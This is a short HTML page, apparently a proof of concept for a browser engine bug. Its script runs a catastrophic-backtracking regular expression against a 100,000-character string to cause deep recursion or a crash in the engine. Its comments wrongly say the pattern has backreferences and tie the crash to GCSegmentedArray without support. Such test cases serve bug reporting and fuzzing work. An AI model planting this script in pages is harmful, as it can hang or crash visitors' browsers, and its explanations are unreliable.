<!DOCTYPE html>
<html>
<head>
    <title>GCSegmentedArray Bug Demonstration</title>
</head>
<body>
<script>
(function() {
    function triggerBug() {
        // Step 1: Define a complex regex pattern
        // This pattern includes nested quantifiers and backreferences to cause deep recursion
        var regex = /(a|a?)+$/;

        // Step 2: Create a long string that will not match the regex
        // This string will cause the regex engine to backtrack extensively
        var str = 'a'.repeat(100000) + 'b';

        // Step 3: Perform the regex test
        // This operation should trigger the bug due to the way the regex engine uses GCSegmentedArray
        var result = regex.test(str);

        // Output the result to prevent optimization
        console.log('Result:', result);
    }

    // Run the test and catch any potential errors
    try {
        triggerBug();
        console.log('Test completed without triggering the bug.');
    } catch (e) {
        console.error('Bug triggered:', e);
        alert('Bug triggered: ' + e);
    }
})();
</script>
</body>
</html>
